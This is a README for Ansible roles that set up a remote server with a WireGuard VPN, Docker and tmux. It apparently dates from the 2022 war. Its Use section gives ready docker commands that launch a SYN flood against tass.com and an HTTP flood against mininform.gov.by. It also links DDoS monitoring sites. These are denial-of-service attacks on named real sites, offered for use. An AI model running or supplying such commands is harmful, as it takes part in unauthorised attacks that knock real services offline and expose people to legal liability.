- [Important](#important)
- [Overview](#overview)
  - [Details](#details)
  - [Monitoring tools](#monitoring-tools)
- [Install](#install)
  - [Deps](#deps)
  - [Install Ansible](#install-ansible)
- [Run](#run)
  - [Digital ocean](#digital-ocean)
- [Use](#use)
  - [Wireguard](#wireguard)
  - [Use tools/get shell](#use-toolsget-shell)
  - [Siege Engine](#siege-engine)
  - [Bombardier](#bombardier)

# Important
* Tested on Ubuntu 20.04
* For now supported SSH keys only
* PRs are welcome

# Overview
Sometimes we may need good internet channel, especially since Feb 24. There may be no good internet channel or no access to the VPN. Solution to it is to set up a server with tools. All you need is to create virtual server or rent physical server

## Details
This is a set ansible roles to install core tools on remote server
* Wireguard VPN, config will be fetched to local
* Docker
* tmux (with `screen` like rc, check `ansible/roles/wireguard/files/.tmux.conf`)

## Monitoring tools
* [Monitor](https://ddosmonitor.herokuapp.com/)
* [Geo distributed monitor](https://www.uptrends.com/tools/uptime)

# Install
## Deps
* `pip` - python package manager. Install doc can be found [here](https://www.geeksforgeeks.org/how-to-install-pip-on-windows/#:~:text=Download%20and%20Install%20pip%3A&text=Download%20the%20get%2Dpip.py,where%20the%20above%20file%20exists.&text=and%20wait%20through%20the%20installation,now%20installed%20on%20your%20system.), note, I've not tested it.
* Wireguard client, install doc can be found [here](https://www.wireguard.com/install/)

## Install Ansible
If you have `pip` installed, than install via pip - [reference](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html#installing-ansible-with-pip)
In short, run
```
python -m pip install --user ansible
```

# Run
## Digital ocean
```
cd ansible/
export a_user="root"
export a_ip="SERVER_IP"
ansible-playbook -i "${a_ip}," -u ${a_user} -b play.yaml
```

# Use
## Wireguard

## Use tools/get shell
Ensure that you have exported variables from [Run](#run) according to your hosting provider and run following
```
ssh ${a_user}@${a_ip}
```

## Siege Engine
Tool for SYN flood, [ref](https://github.com/smok-serwis/siege-engine)
```
docker run --rm -it mack/battle-tools python3 -m siege_engine 300 tass.com
```

## Bombardier
Tool for HTTP stress (we should use `--http2` because [fasthttp issue](https://github.com/codesenberg/bombardier#known-issues))
```
docker run --rm -it mack/battle-tools bombardier --http2 -c 200 -d 300s -l https://mininform.gov.by
```
